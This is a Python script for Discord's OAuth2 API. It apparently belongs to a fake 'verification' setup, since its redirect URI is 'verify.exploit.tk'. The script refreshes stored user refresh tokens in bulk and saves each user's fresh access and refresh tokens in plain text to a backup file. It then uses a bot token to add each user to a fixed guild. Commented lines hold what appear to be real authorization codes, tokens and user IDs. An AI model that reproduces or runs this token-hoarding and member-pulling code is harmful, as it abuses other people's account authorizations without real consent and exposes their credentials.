import discord
import requests
import  json
from discord import *
from discord.ext import commands

API_ENDPOINT = 'https://discord.com/api/v9'
CLIENT_ID = '994684314010796083'
CLIENT_SECRET = ''
REDIRECT_URI = 'https://verify.exploit.tk'
tkn = ""

def exchange_code(code):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': REDIRECT_URI
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = requests.post(str(API_ENDPOINT) + '/oauth2/token' , data=data, headers=headers)
  # r.raise_for_status()
  print(r.json())
  return r.json()


def add_to_guild(access_token, userID , guild_Id ):
        url = f"{API_ENDPOINT}/guilds/{guild_Id}/members/{userID}"

        botToken = tkn
        data = {
        "access_token" : access_token,
    }
        headers = {
        "Authorization" : f"Bot {botToken}",
        'Content-Type': 'application/json'

    }
        response = requests.put(url=url, headers=headers, json=data)
        print(response.status_code)
        print(response.text)
        # print(REDIRECT_URI)
# code = exchange_code('hH1nT2GnFtW1WXp84trdW27dbzth7a')
# print(code)
# add_to_guild(access_token="iZawnWoZ5fbk2zTojmTJBlc3sVfGS6", userID="865227184146087956" , guild_Id="952495772073619466")

def get_new_token(refresh):
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh
  }
  r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
  print(r.status_code)
  # if r.status_code in (200, 201, 204):
  return r.json()

file = open("refresh.json", "r")
refresh = json.load(file)
for key in refresh:
  try:
    print(key)
    print(refresh[key])
    new_token = get_new_token(refresh[key])
    access = new_token['access_token']
    refreshtk = new_token['refresh_token']
    f = open("backups.txt", "a")
    f.write(f"{key}:{access}:{refreshtk}\n")
    print(f"{key}:{access}:{refreshtk}")
    add_to_guild(access, key, "931672815931904020")
  except:
    pass
# ok = get_new_token('ru0HgOGkAYDuVr8lthdQcP5t4XNE3E')
# print(ok)
